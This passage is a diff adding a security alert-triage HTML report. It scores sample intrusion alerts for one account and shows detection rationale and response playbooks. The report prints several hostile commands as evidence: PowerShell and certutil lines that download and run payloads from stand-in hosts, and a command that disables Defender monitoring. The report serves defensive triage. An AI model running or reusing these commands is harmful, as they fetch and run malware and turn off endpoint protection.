@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Alert Triage Queue</title>
+<style>
+:root {
+  --page:#eef1f4; --card:#ffffff; --ink:#1c2530; --muted:#68737f; --line:#dde2e8;
+  --band:#16202b;
+  --critical:#c62828; --high:#e05d1f; --medium:#b8860b; --low:#2f6f9f; --info:#6b7280;
+}
+* { box-sizing:border-box; }
+body { margin:0; background:var(--page); color:var(--ink);
+  font:14px/1.55 "Segoe UI",system-ui,-apple-system,sans-serif; }
+header { background:var(--band); color:#eef1f4; padding:26px 34px 22px; }
+header h1 { margin:0; font-size:20px; font-weight:600; letter-spacing:.4px; }
+header .lead { margin:4px 0 0; color:#9fb0c0; font-size:12.5px; }
+header code { color:#d7e3ee; }
+.tiles { display:flex; gap:10px; flex-wrap:wrap; margin-top:18px; }
+.tile { flex:1 1 110px; background:#1e2b38; border-radius:7px; padding:9px 12px;
+  border-left:4px solid var(--info); }
+.tile-n { display:block; font-size:21px; font-weight:600; color:#fff; }
+.tile-l { font-size:10.5px; text-transform:uppercase; letter-spacing:1.1px; color:#9fb0c0; }
+.tile.critical { border-left-color:var(--critical); } .tile.high { border-left-color:var(--high); }
+.tile.medium { border-left-color:var(--medium); } .tile.low { border-left-color:var(--low); }
+main { padding:26px 34px 50px; max-width:1120px; margin:0 auto; }
+
+.case { background:var(--card); border:1px solid var(--line); border-radius:10px;
+  margin-bottom:20px; overflow:hidden; box-shadow:0 1px 2px rgba(20,30,40,.06); }
+.case-top { display:flex; gap:18px; padding:18px 20px; align-items:flex-start; }
+.case-top.critical { border-top:3px solid var(--critical); }
+.case-top.high { border-top:3px solid var(--high); }
+.case-top.medium { border-top:3px solid var(--medium); }
+.case-top.low { border-top:3px solid var(--low); }
+.case-top.info { border-top:3px solid var(--info); }
+.dial { width:72px; height:72px; border-radius:50%; display:flex; align-items:center;
+  justify-content:center; flex:0 0 72px; }
+.dial span { width:54px; height:54px; border-radius:50%; background:var(--card);
+  display:flex; align-items:center; justify-content:center; font-size:19px; font-weight:700; }
+.case-main { flex:1 1 auto; min-width:0; }
+.case-id { font-size:11px; text-transform:uppercase; letter-spacing:1.2px; color:var(--muted); }
+.case-account { font-size:18px; font-weight:600; margin:1px 0 6px; }
+.case-summary { margin:0 0 10px; color:#39434e; }
+.facts { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:8px; }
+.fact { font-size:11.5px; background:#f1f4f7; border:1px solid var(--line);
+  border-radius:5px; padding:2px 9px; color:#41505e; }
+.fact b { color:var(--ink); font-weight:600; }
+.chain { list-style:none; display:flex; flex-wrap:wrap; gap:0; margin:10px 0 6px; padding:0; }
+.chain li { font-size:11.5px; color:#41505e; padding:2px 14px 2px 0; position:relative;
+  display:flex; align-items:center; gap:6px; }
+.chain li:not(:last-child)::after { content:"\203A"; position:absolute; right:5px; color:#aab4bf; }
+.step-dot { width:7px; height:7px; border-radius:50%; background:var(--low); flex:0 0 7px; }
+.origin-row { display:flex; align-items:center; gap:7px; flex-wrap:wrap; margin:7px 0 0; }
+.origin-label { font-size:10.5px; text-transform:uppercase; letter-spacing:1px;
+  color:var(--muted); min-width:104px; }
+.asset-chip { font-family:Consolas,monospace; font-size:11.5px; background:#eceff2;
+  border:1px solid var(--line); border-radius:4px; padding:2px 8px; color:#33404c; }
+.origin-chip { font-family:Consolas,monospace; font-size:11.5px; border-radius:4px;
+  padding:2px 8px; border:1px solid var(--line); background:#eceff2; color:#33404c; }
+.origin-chip em { font-style:normal; font-family:"Segoe UI",sans-serif; font-size:10px;
+  text-transform:uppercase; letter-spacing:.7px; margin-left:7px; opacity:.75; }
+.origin-chip.external { background:#fdeceb; border-color:#f2c4c1; color:#8e2620; }
+.origin-chip.internal { background:#fff6e0; border-color:#ecd9a6; color:#6d5312; }
+.ioc-chip { display:inline-block; font-size:11px; border-radius:4px; padding:2px 8px;
+  margin:3px 5px 0 0; font-family:Consolas,monospace; }
+.ioc-chip.malicious { background:#fce8e8; color:#8e1f1f; border:1px solid #f0c2c2; }
+.ioc-chip.suspicious { background:#fdf0e2; color:#8a4512; border:1px solid #f2d5b6; }
+
+.case-alerts { border-top:1px solid var(--line); background:#f7f9fb; padding:6px 10px 10px; }
+.case-alerts h3 { font-size:10.5px; text-transform:uppercase; letter-spacing:1.2px;
+  color:var(--muted); margin:10px 10px 6px; font-weight:600; }
+details.alert { background:var(--card); border:1px solid var(--line); border-left:3px solid var(--info);
+  border-radius:7px; margin:0 0 7px; }
+details.alert.critical { border-left-color:var(--critical); }
+details.alert.high { border-left-color:var(--high); }
+details.alert.medium { border-left-color:var(--medium); }
+details.alert.low { border-left-color:var(--low); }
+summary { cursor:pointer; padding:9px 13px; display:flex; align-items:center; gap:10px;
+  flex-wrap:wrap; list-style:none; }
+summary::-webkit-details-marker { display:none; }
+summary::before { content:"\25B8"; color:var(--muted); font-size:11px; }
+details[open] > summary::before { content:"\25BE"; }
+.score-pill { font-family:Consolas,monospace; font-size:12px; font-weight:700; color:#fff;
+  background:var(--info); border-radius:4px; padding:1px 7px; min-width:34px; text-align:center; }
+.score-pill.critical { background:var(--critical); } .score-pill.high { background:var(--high); }
+.score-pill.medium { background:var(--medium); } .score-pill.low { background:var(--low); }
+.a-rule { font-weight:600; }
+.a-meta { font-size:11.5px; color:var(--muted); }
+.a-body { padding:2px 14px 15px; border-top:1px solid var(--line); }
+.a-body h4 { font-size:10.5px; text-transform:uppercase; letter-spacing:1.1px;
+  color:var(--muted); margin:15px 0 5px; }
+.why { margin:11px 0; color:#39434e; }
+pre { background:#f4f6f8; border:1px solid var(--line); border-radius:5px; padding:9px 11px;
+  overflow-x:auto; font-family:Consolas,monospace; font-size:12.5px; margin:6px 0; color:#22303c; }
+pre.decoded { border-left:3px solid #7c4dbe; background:#f7f3fc; }
+.grid { width:100%; border-collapse:collapse; font-size:12.5px; }
+.grid th { text-align:left; color:var(--muted); font-weight:600; font-size:11px;
+  text-transform:uppercase; letter-spacing:.6px; border-bottom:1px solid var(--line); padding:5px 8px; }
+.grid td { border-bottom:1px solid var(--line); padding:6px 8px; vertical-align:top; }
+.verdict { font-size:11px; border-radius:4px; padding:1px 8px; }
+.verdict.malicious { background:#fce8e8; color:#8e1f1f; }
+.verdict.suspicious { background:#fdf0e2; color:#8a4512; }
+.verdict.clean { background:#e6f4ea; color:#1e6b34; }
+.verdict.internal { background:#eceff2; color:#4a5560; }
+.verdict.unknown { background:#f1f4f7; color:#5a6672; }
+.verdict.asset { background:#eceff2; color:#4a5560; }
+.role { font-size:10px; text-transform:uppercase; letter-spacing:.7px; border-radius:3px;
+  padding:1px 6px; background:#eceff2; color:#5a6672; }
+.role.source { background:#e7eefc; color:#26437e; }
+.role.asset { background:#f3f0e8; color:#6a5c38; }
+.tag { font-size:10.5px; background:#f0eaf9; color:#5b3a8e; border-radius:4px; padding:1px 6px; }
+.breakdown .pts { width:50px; font-family:Consolas,monospace; font-weight:700; text-align:right; }
+.mono { font-family:Consolas,monospace; word-break:break-all; }
+.muted { color:var(--muted); }
+.omitted { color:var(--muted); font-size:12.5px; text-align:center; margin:18px 0 0; }
+.action { margin:5px 0; padding:8px 11px; background:#f4f6f8; border-left:3px solid var(--low);
+  border-radius:0 5px 5px 0; }
+.playbook { margin:6px 0 0 18px; padding:0; color:#39434e; }
+.playbook li { margin:3px 0; }
+footer { border-top:1px solid var(--line); padding:18px 34px; color:var(--muted);
+  font-size:11.5px; background:var(--card); }
+/* A printed report is a ticket attachment: every alert body has to be on the
+   paper, and the dark chrome re-inked, because browsers drop backgrounds but
+   keep the light text that was sitting on them. */
+@media print {
+  @page { margin:14mm; }
+  body { background:#fff; }
+  main { padding:14px 0 0; max-width:none; }
+  /* Closed <details> are hidden by the browser, by a mechanism that differs per
+     engine, so unhide both the pseudo-element and the children directly or the
+     paper shows summaries and nothing else. */
+  details.alert > *:not(summary) { display:block !important; }
+  details.alert::details-content { content-visibility:visible !important;
+    block-size:auto !important; }
+  summary::before, details[open] > summary::before { display:none; }
+  /* An alert body can outrun a page, so forbid only the breaks that strand a
+     heading from what it heads. */
+  summary { cursor:auto; break-after:avoid; page-break-after:avoid; }
+  .case { box-shadow:none; }
+  .case-top { break-inside:avoid; page-break-inside:avoid; break-after:avoid; }
+  .a-body h4 { break-after:avoid; page-break-after:avoid; }
+  pre { white-space:pre-wrap; word-break:break-all; }
+  header { background:#fff; color:#1c2530; border-bottom:2px solid #1c2530;
+    padding:0 0 12px; break-after:avoid; }
+  header .lead { color:#41505e; }
+  header code { color:#1c2530; }
+  .tile { background:#fff; border:1px solid #dde2e8; }
+  .tile-n { color:#1c2530; }
+  .tile-l { color:#41505e; }
+  .score-pill { background:#fff !important; color:#1c2530; border:1px solid #1c2530; }
+  .verdict, .role, .tag, .fact, .asset-chip, .origin-chip { border:1px solid #c8ced5;
+    color:#1c2530; background:#fff; }
+  .dial { border:2px solid #1c2530; }
+  footer { break-inside:avoid; page-break-inside:avoid; padding:14px 0; }
+}
+</style></head><body>
+<header>
+  <h1>Alert Triage Queue</h1>
+  <p class="lead">
+    18 alert(s) folded into 5 case(s) &middot; generated 2026-08-23 14:39:31
+    &middot; engine v1.0.0<br>
+    Intake <code>samples\findings.json</code> (18 finding(s))
+    &middot; enrichment: offline snapshot (no network, no API keys)  [verdicts from: offline-snapshot (AbuseIPDB-shaped) x8, offline-snapshot (VirusTotal-shaped) x2]
+    &middot; 10 indicator lookup(s), 4 cached
+  </p>
+  <div class="tiles"><div class="tile critical"><span class="tile-n">7</span><span class="tile-l">Critical</span></div><div class="tile high"><span class="tile-n">3</span><span class="tile-l">High</span></div><div class="tile medium"><span class="tile-n">7</span><span class="tile-l">Medium</span></div><div class="tile low"><span class="tile-n">1</span><span class="tile-l">Low</span></div><div class="tile info"><span class="tile-n">0</span><span class="tile-l">Informational</span></div></div>
+</header>
+<main>
+
+  <section class="case">
+    <div class="case-top critical">
+      <div class="dial" style="background:conic-gradient(#c62828 360deg,#e3e6ea 360deg)"><span>100</span></div>
+      <div class="case-main">
+        <div class="case-id">Case #1 &middot; Critical</div>
+        <div class="case-account">CORP\jdoe</div>
+        <p class="case-summary">11 alert(s) on CORP\jdoe, on VPN-GW-01, WKSTN-0412, driven from outside the network via 198.51.100.30, spanning Initial Access -&gt; Execution -&gt; Persistence -&gt; Defense Evasion -&gt; Credential Access -&gt; Discovery -&gt; Command and Control, touching known-bad 203.0.113.233, 7446d75f3dfee276699f5abbdd774098006130e6576ab85fde1d44f58455214e, cdn-update.xyz.</p>
+        <div class="facts">
+          <span class="fact">queue <b>Tier 2 / Incident Response</b></span>
+          <span class="fact">SLA <b>15 min</b></span>
+          <span class="fact">account <b>standard</b></span>
+          <span class="fact">alerts <b>11</b></span>
+          <span class="fact">window <b>2026-08-20 03:12:04 &ndash; 2026-08-20 09:48:31</b></span>
+        </div>
+        <div class="origin-row"><span class="origin-label">affected hosts</span><span class="asset-chip">VPN-GW-01</span><span class="asset-chip">WKSTN-0412</span></div><div class="origin-row"><span class="origin-label">originated from</span><span class="origin-chip external">198.51.100.30<em>external &middot; suspicious</em></span></div>
+        <ol class="chain"><li><span class="step-dot"></span>Initial Access</li><li><span class="step-dot"></span>Execution</li><li><span class="step-dot"></span>Persistence</li><li><span class="step-dot"></span>Defense Evasion</li><li><span class="step-dot"></span>Credential Access</li><li><span class="step-dot"></span>Discovery</li><li><span class="step-dot"></span>Command and Control</li></ol>
+        <div><span class="ioc-chip suspicious">198.51.100.30</span><span class="ioc-chip malicious">203.0.113.233</span><span class="ioc-chip malicious">7446d75f3dfee276699f5abbdd774098006130e6576ab85fde1d44f58455214e</span><span class="ioc-chip malicious">cdn-update.xyz</span></div>
+      </div>
+    </div>
+    <div class="case-alerts">
+      <h3>Alerts in this case (11 of 11)</h3>
+      
+      <details class="alert critical">
+        <summary>
+          <span class="score-pill critical">100</span>
+          <span class="a-rule">Repeated failed logons for a single account</span>
+          <span class="a-meta">2026-08-20T03:12:04 &middot; T1110.003</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">Several failed authentication attempts for one account in quick succession. Individually weak evidence - users mistype passwords - but the pattern matters when it repeats across accounts.</p>
+          <p class="a-meta">log channel SECURITY &middot;
+             ALRT-0001 &middot; detection severity Low</p>
+          <div class="facts"><span class="fact">host <b>VPN-GW-01</b></span><span class="fact">from <b>198.51.100.30</b> (external)</span><span class="fact">logon type <b>3</b></span></div>
+          
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td><span class="role source">source</span></td><td>ip</td><td class="mono">198.51.100.30</td><td><span class="verdict suspicious">suspicious</span> </td><td class="muted">Low-confidence abuse reports, mostly authentication brute-force. Not conclusive on its own - the shared-origin correlation is what makes it matter here.</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+10</td><td><strong>Detection severity: Low</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+20</td><td><strong>Threat intel: 198.51.100.30 (source) = suspicious</strong><br><span class="muted">indicator has partial / low-confidence detections</span></td></tr><tr><td class="pts">+10</td><td><strong>Context: 03:12 is outside business hours</strong><br><span class="muted">activity occurred outside configured business hours</span></td></tr><tr><td class="pts">+18</td><td><strong>Context: session originated externally from 198.51.100.30</strong><br><span class="muted">the session originated from a routable external address rather than the console of the affected host - someone drove this from outside the network</span></td></tr><tr><td class="pts">+24</td><td><strong>Correlation: 7 ATT&amp;CK tactics on this account</strong><br><span class="muted">this account&#x27;s alerts span multiple consecutive ATT&amp;CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -&gt; Execution -&gt; Persistence -&gt; Defense Evasion -&gt; Credential Access -&gt; Discovery -&gt; Command and Control)</span></td></tr><tr><td class="pts">+10</td><td><strong>Correlation: repeated detection (RECON-BURST x3)</strong><br><span class="muted">the same detection fired repeatedly for this account</span></td></tr><tr><td class="pts">+12</td><td><strong>Correlation: 10 alerts within 10 minutes</strong><br><span class="muted">many alerts for this account landed inside a short window</span></td></tr><tr><td class="pts">+20</td><td><strong>Correlation: origin 198.51.100.30 touched 3 accounts within 30 minutes (ademir, jdoe, mkaya)</strong><br><span class="muted">one origin address touched several different accounts in a short window - the signature of password spraying, credential stuffing, or one stolen credential being reused across the network. Grouping alerts by account cannot see this: each account shows only a single unremarkable alert</span></td></tr><tr><td class="pts muted">=</td><td class="muted">raw 124 clamped to 100</td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend containment now: isolate the host and disable the account pending review.</p>
+          <ol class="playbook"><li>Establish which credentials are actually implicated: a dumped secret store, or accounts targeted by repeated authentication attempts.</li><li>If a credential store or memory dump is involved, treat every credential used on this host as exposed and force a password reset for the affected account and any cached domain accounts.</li><li>If the evidence is failed authentication, check lockout policy and look for any attempt from the same origin that succeeded.</li><li>Pull the authentication trail for the affected accounts and the originating address across the alert window.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+      <details class="alert critical">
+        <summary>
+          <span class="score-pill critical">100</span>
+          <span class="a-rule">Office process spawned a shell</span>
+          <span class="a-meta">2026-08-20T09:41:12 &middot; T1566 / T1059</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">A Microsoft Office application launched a command interpreter, the classic macro-lure execution chain.</p>
+          <p class="a-meta">log channel SYSMON &middot;
+             ALRT-0004 &middot; detection severity High</p>
+          <div class="facts"><span class="fact">host <b>WKSTN-0412</b></span></div>
+          <pre>cmd.exe /c powershell -w hidden -nop -c &quot;iwr https://cdn-update.xyz/inv/stage1.ps1 -UseBasicParsing | iex&quot;</pre>
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td><span class="role destination">destination</span></td><td>url</td><td class="mono">https://cdn-update.xyz/inv/stage1.ps1</td><td><span class="verdict unknown">unknown</span> </td><td class="muted">URL kept as context; its host is enriched separately</td></tr><tr><td><span class="role destination">destination</span></td><td>domain</td><td class="mono">cdn-update.xyz</td><td><span class="verdict malicious">malicious</span> </td><td class="muted">Registered 9 days before the alert. Typosquat-style CDN name on a low-cost TLD.</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+50</td><td><strong>Detection severity: High</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+40</td><td><strong>Threat intel: cdn-update.xyz (destination) = malicious</strong><br><span class="muted">indicator is known-bad in threat intelligence</span></td></tr><tr><td class="pts">+8</td><td><strong>Context: external destination referenced</strong><br><span class="muted">the command line references a routable external address</span></td></tr><tr><td class="pts">+24</td><td><strong>Correlation: 7 ATT&amp;CK tactics on this account</strong><br><span class="muted">this account&#x27;s alerts span multiple consecutive ATT&amp;CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -&gt; Execution -&gt; Persistence -&gt; Defense Evasion -&gt; Credential Access -&gt; Discovery -&gt; Command and Control)</span></td></tr><tr><td class="pts">+10</td><td><strong>Correlation: repeated detection (RECON-BURST x3)</strong><br><span class="muted">the same detection fired repeatedly for this account</span></td></tr><tr><td class="pts">+12</td><td><strong>Correlation: 10 alerts within 10 minutes</strong><br><span class="muted">many alerts for this account landed inside a short window</span></td></tr><tr><td class="pts muted">=</td><td class="muted">raw 144 clamped to 100</td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend containment now: isolate the host and disable the account pending review.</p>
+          <ol class="playbook"><li>Decode and read the actual command before judging intent.</li><li>Determine whether the interpreter run is user-initiated or spawned by another process.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+      <details class="alert critical">
+        <summary>
+          <span class="score-pill critical">100</span>
+          <span class="a-rule">Encoded PowerShell command</span>
+          <span class="a-meta">2026-08-20T09:41:58 &middot; T1059.001 / T1027</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">PowerShell was launched with a Base64-encoded command, a very common obfuscation and execution technique used to hide intent from log review.</p>
+          <p class="a-meta">log channel PS4104 &middot;
+             ALRT-0005 &middot; detection severity High</p>
+          <div class="facts"><span class="fact">host <b>WKSTN-0412</b></span></div>
+          <pre>powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAyADMAMwAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==</pre>
+          <pre class="decoded">IEX (New-Object Net.WebClient).DownloadString(&#x27;http://203.0.113.233/beacon.ps1&#x27;)</pre>
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td><span class="role destination">destination</span></td><td>url</td><td class="mono">http://203.0.113.233/beacon.ps1</td><td><span class="verdict unknown">unknown</span> <span class="tag">via decode</span></td><td class="muted">URL kept as context; its host is enriched separately</td></tr><tr><td><span class="role destination">destination</span></td><td>ip</td><td class="mono">203.0.113.233</td><td><span class="verdict malicious">malicious</span> <span class="tag">via decode</span></td><td class="muted">Reported repeatedly as a commodity-loader C2 node.</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+50</td><td><strong>Detection severity: High</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+40</td><td><strong>Threat intel: 203.0.113.233 (destination) = malicious</strong><br><span class="muted">indicator is known-bad in threat intelligence (recovered only after decoding the payload)</span></td></tr><tr><td class="pts">+8</td><td><strong>Context: external destination referenced</strong><br><span class="muted">the command line references a routable external address</span></td></tr><tr><td class="pts">+24</td><td><strong>Correlation: 7 ATT&amp;CK tactics on this account</strong><br><span class="muted">this account&#x27;s alerts span multiple consecutive ATT&amp;CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -&gt; Execution -&gt; Persistence -&gt; Defense Evasion -&gt; Credential Access -&gt; Discovery -&gt; Command and Control)</span></td></tr><tr><td class="pts">+10</td><td><strong>Correlation: repeated detection (RECON-BURST x3)</strong><br><span class="muted">the same detection fired repeatedly for this account</span></td></tr><tr><td class="pts">+12</td><td><strong>Correlation: 10 alerts within 10 minutes</strong><br><span class="muted">many alerts for this account landed inside a short window</span></td></tr><tr><td class="pts muted">=</td><td class="muted">raw 144 clamped to 100</td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend containment now: isolate the host and disable the account pending review.</p>
+          <ol class="playbook"><li>Verify endpoint protection is still enabled and reporting.</li><li>Review any exclusion paths that were added and remove unapproved ones.</li><li>Assume telemetry gaps for the period after the tampering.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+      <details class="alert critical">
+        <summary>
+          <span class="score-pill critical">100</span>
+          <span class="a-rule">PowerShell download cradle</span>
+          <span class="a-meta">2026-08-20T09:42:31 &middot; T1105 / T1059.001</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">A remote payload is downloaded and piped straight into execution (download-and-run), a hallmark of staged malware delivery.</p>
+          <p class="a-meta">log channel PS4104 &middot;
+             ALRT-0006 &middot; detection severity High</p>
+          <div class="facts"><span class="fact">host <b>WKSTN-0412</b></span></div>
+          <pre>IEX (New-Object Net.WebClient).DownloadString(&#x27;http://203.0.113.233/beacon.ps1&#x27;)</pre>
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td><span class="role destination">destination</span></td><td>url</td><td class="mono">http://203.0.113.233/beacon.ps1</td><td><span class="verdict unknown">unknown</span> </td><td class="muted">URL kept as context; its host is enriched separately</td></tr><tr><td><span class="role destination">destination</span></td><td>ip</td><td class="mono">203.0.113.233</td><td><span class="verdict malicious">malicious</span> </td><td class="muted">Reported repeatedly as a commodity-loader C2 node.</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+50</td><td><strong>Detection severity: High</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+40</td><td><strong>Threat intel: 203.0.113.233 (destination) = malicious</strong><br><span class="muted">indicator is known-bad in threat intelligence</span></td></tr><tr><td class="pts">+8</td><td><strong>Context: external destination referenced</strong><br><span class="muted">the command line references a routable external address</span></td></tr><tr><td class="pts">+24</td><td><strong>Correlation: 7 ATT&amp;CK tactics on this account</strong><br><span class="muted">this account&#x27;s alerts span multiple consecutive ATT&amp;CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -&gt; Execution -&gt; Persistence -&gt; Defense Evasion -&gt; Credential Access -&gt; Discovery -&gt; Command and Control)</span></td></tr><tr><td class="pts">+10</td><td><strong>Correlation: repeated detection (RECON-BURST x3)</strong><br><span class="muted">the same detection fired repeatedly for this account</span></td></tr><tr><td class="pts">+12</td><td><strong>Correlation: 10 alerts within 10 minutes</strong><br><span class="muted">many alerts for this account landed inside a short window</span></td></tr><tr><td class="pts muted">=</td><td class="muted">raw 144 clamped to 100</td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend containment now: isolate the host and disable the account pending review.</p>
+          <ol class="playbook"><li>Block the external indicator at the egress proxy / firewall.</li><li>Pull full network flow for this host over the alert window.</li><li>Check whether other hosts contacted the same indicator.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+      <details class="alert critical">
+        <summary>
+          <span class="score-pill critical">96</span>
+          <span class="a-rule">Defender tampering</span>
+          <span class="a-meta">2026-08-20T09:43:04 &middot; T1562.001</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">Windows Defender real-time protection is being disabled or given exclusions, a common step to blind the endpoint before further activity.</p>
+          <p class="a-meta">log channel PS4104 &middot;
+             ALRT-0007 &middot; detection severity High</p>
+          <div class="facts"><span class="fact">host <b>WKSTN-0412</b></span></div>
+          <pre>Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath C:\Users\Public</pre>
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td colspan="5" class="muted">no indicators referenced</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+50</td><td><strong>Detection severity: High</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+24</td><td><strong>Correlation: 7 ATT&amp;CK tactics on this account</strong><br><span class="muted">this account&#x27;s alerts span multiple consecutive ATT&amp;CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -&gt; Execution -&gt; Persistence -&gt; Defense Evasion -&gt; Credential Access -&gt; Discovery -&gt; Command and Control)</span></td></tr><tr><td class="pts">+10</td><td><strong>Correlation: repeated detection (RECON-BURST x3)</strong><br><span class="muted">the same detection fired repeatedly for this account</span></td></tr><tr><td class="pts">+12</td><td><strong>Correlation: 10 alerts within 10 minutes</strong><br><span class="muted">many alerts for this account landed inside a short window</span></td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend containment now: isolate the host and disable the account pending review.</p>
+          <ol class="playbook"><li>Verify endpoint protection is still enabled and reporting.</li><li>Review any exclusion paths that were added and remove unapproved ones.</li><li>Assume telemetry gaps for the period after the tampering.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+      <details class="alert critical">
+        <summary>
+          <span class="score-pill critical">100</span>
+          <span class="a-rule">certutil used as a downloader / decoder</span>
+          <span class="a-meta">2026-08-20T09:44:17 &middot; T1105 / T1140</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">certutil is a signed Windows binary abused to download files or decode Base64 payloads, bypassing application controls (a &#x27;living off the land&#x27; technique).</p>
+          <p class="a-meta">log channel SECURITY &middot;
+             ALRT-0008 &middot; detection severity High</p>
+          <div class="facts"><span class="fact">host <b>WKSTN-0412</b></span></div>
+          <pre>certutil.exe -urlcache -split -f http://203.0.113.233/a.exe C:\Users\Public\a.exe</pre>
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td><span class="role destination">destination</span></td><td>url</td><td class="mono">http://203.0.113.233/a.exe</td><td><span class="verdict unknown">unknown</span> </td><td class="muted">URL kept as context; its host is enriched separately</td></tr><tr><td><span class="role destination">destination</span></td><td>ip</td><td class="mono">203.0.113.233</td><td><span class="verdict malicious">malicious</span> </td><td class="muted">Reported repeatedly as a commodity-loader C2 node.</td></tr><tr><td><span class="role destination">destination</span></td><td>hash</td><td class="mono">7446d75f3dfee276699f5abbdd774098006130e6576ab85fde1d44f58455214e</td><td><span class="verdict malicious">malicious</span> </td><td class="muted">Widely detected downloader stub.</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+50</td><td><strong>Detection severity: High</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+40</td><td><strong>Threat intel: 203.0.113.233 (destination) = malicious</strong><br><span class="muted">indicator is known-bad in threat intelligence</span></td></tr><tr><td class="pts">+8</td><td><strong>Context: external destination referenced</strong><br><span class="muted">the command line references a routable external address</span></td></tr><tr><td class="pts">+24</td><td><strong>Correlation: 7 ATT&amp;CK tactics on this account</strong><br><span class="muted">this account&#x27;s alerts span multiple consecutive ATT&amp;CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -&gt; Execution -&gt; Persistence -&gt; Defense Evasion -&gt; Credential Access -&gt; Discovery -&gt; Command and Control)</span></td></tr><tr><td class="pts">+10</td><td><strong>Correlation: repeated detection (RECON-BURST x3)</strong><br><span class="muted">the same detection fired repeatedly for this account</span></td></tr><tr><td class="pts">+12</td><td><strong>Correlation: 10 alerts within 10 minutes</strong><br><span class="muted">many alerts for this account landed inside a short window</span></td></tr><tr><td class="pts muted">=</td><td class="muted">raw 144 clamped to 100</td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend containment now: isolate the host and disable the account pending review.</p>
+          <ol class="playbook"><li>Block the external indicator at the egress proxy / firewall.</li><li>Pull full network flow for this host over the alert window.</li><li>Check whether other hosts contacted the same indicator.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+      <details class="alert high">
+        <summary>
+          <span class="score-pill high">76</span>
+          <span class="a-rule">Registry Run-key persistence</span>
+          <span class="a-meta">2026-08-20T09:45:02 &middot; T1547.001</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">An autorun value is written under a Run/RunOnce key so a program relaunches at logon, a common persistence mechanism.</p>
+          <p class="a-meta">log channel SECURITY &middot;
+             ALRT-0009 &middot; detection severity Medium</p>
